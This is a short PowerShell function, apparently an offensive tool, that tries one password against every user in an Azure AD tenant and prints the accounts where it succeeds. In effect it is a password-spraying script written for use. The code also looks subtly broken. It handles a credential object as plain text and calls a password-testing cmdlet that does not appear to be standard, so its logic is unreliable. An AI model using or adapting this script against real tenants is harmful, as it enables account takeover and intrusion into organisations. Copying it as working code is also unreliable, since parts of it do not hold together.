Function Invoke-AADPasswordBruteForce {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$true)]
        [string]$Username,
        [Parameter(Mandatory=$True)]
        [PSCredential]$Password,
        [Parameter(Mandatory=$False)]
        [string]$TenantDomain
    )
 
    BEGIN {
        $Domain = ($TenantDomain -split '\.')[0]
        Write-Output "[+] Brute forcing users against the ""$($Domain)"" domain using the password ""$($Password)"""
    }
 
    PROCESS {
        $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)
        Connect-AzureAD -Credential $Credential
        Try {
            $Users = Get-AzureADUser -All $true
            ForEach ($User in $Users) {
                If (Test-AzureADUserPassword -ObjectId $User.ObjectId -Password $Password) {
                    Write-Output "[+] $($User.UserPrincipalName) password is $($Password)"
                }
            }
        } Catch {
            Write-Output "[-] Error reaching the server. Aborting"
            exit
        }
    }
 
    END {
        Write-Output "[+] Process completed..."
    }
}
